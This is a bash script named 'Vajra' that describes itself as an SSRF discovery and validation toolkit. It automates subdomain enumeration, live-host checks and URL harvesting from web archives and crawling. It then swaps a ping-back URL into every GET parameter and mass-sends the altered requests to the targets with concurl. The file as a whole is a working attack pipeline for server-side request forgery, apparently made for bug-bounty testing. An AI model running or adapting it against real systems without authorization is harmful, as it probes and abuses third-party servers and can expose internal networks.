#!/bin/bash

# Tools used: subfinder, assetfinder, anew, httpx, waybackurls, gau, hakrawler, anti-burl, qsreplace, concurl


RED='\033[1;31m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
NC='\033[0m'

echo -e "${BLUE}"
echo "██╗   ██╗ █████╗      ██╗██████╗  █████╗ "
echo "██║   ██║██╔══██╗     ██║██╔══██╗██╔══██╗"
echo "██║   ██║███████║     ██║██████╔╝███████║"
echo "╚██╗ ██╔╝██╔══██║██   ██║██╔══██╗██╔══██║"
echo " ╚████╔╝ ██║  ██║╚█████╔╝██║  ██║██║  ██║"
echo "  ╚═══╝  ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"
echo -e "${NC}"

echo -e "${YELLOW}⚡ Vajra${NC}"
echo -e "${GREEN} SSRF Discovery & Validatison Toolkit${NC}"
echo -e "Author: ${RED}Sakhreliya-Nihar${NC}"
echo


# Check usage
if [ $# -ne 2 ]; then
    echo "Usage: $0 <domain_list_file> <ping_back_url>"
    echo -e "Example: $0 hackerone.txt https://burp-collaborator.net\n"
    exit 1
fi

domain_file=$1
ping_back_url=$2
output_dir="./$(basename $domain_file .txt)"

# Ensure domain file exists
if [ ! -f $domain_file ]; then
    echo "Domain list file not found: $domain_file"
    exit 1
fi

# Create output directory
mkdir -p $output_dir

# Subdomain collection
echo "[+] Collecting subdomains"
subfinder -dL $domain_file -silent -o $output_dir/domains.txt
cat $domain_file | assetfinder -subs-only | anew $output_dir/domains.txt

# Check live hosts
echo -e "\n[+] Checking live hosts"
httpx -l $output_dir/domains.txt -silent -o $output_dir/live-domains.txt > /dev/null
live_count=$(wc -l < $output_dir/live-domains.txt)
total_count=$(wc -l < $output_dir/domains.txt)
echo -e "[+] $live_count out of $total_count hosts are live"

# Collect URLs from various sources
echo -e "[+] Collecting Wayback data"
cat $output_dir/live-domains.txt | waybackurls >> $output_dir/waybackdata.txt

echo -e "\n[+] Collecting Gau data"
cat $output_dir/live-domains.txt | gau >> $output_dir/gau.txt

echo -e "\n[+] Crawling domains"
cat $output_dir/live-domains.txt | hakrawler -insecure -subs -t 10 -u >> $output_dir/crawled-domains.txt

# Process archived data
echo -e "\n[+] Crawling archived data"
cat $output_dir/waybackdata.txt $output_dir/gau.txt | sort -u | anti-burl | awk '{print $4}' | anew $output_dir/crawled-archived-urls.txt

# Inject SSRF payloads
echo -e "\n[+] Injecting SSRF payloads in GET parameter values"
cat $output_dir/* | grep "=" | qsreplace "$ping_back_url" | anew $output_dir/checkSSRF.txt

# Fuzzing URLs
echo -e "\n[+] Final stage | Fuzzing URLs"
cat $output_dir/checkSSRF.txt | concurl -d 4000 -o $output_dir/concurl-output -- -L > /dev/null

echo -e "\n[+] SSRF Hunt completed for domains in $domain_file"
echo -e "[+] Check your domain/polls"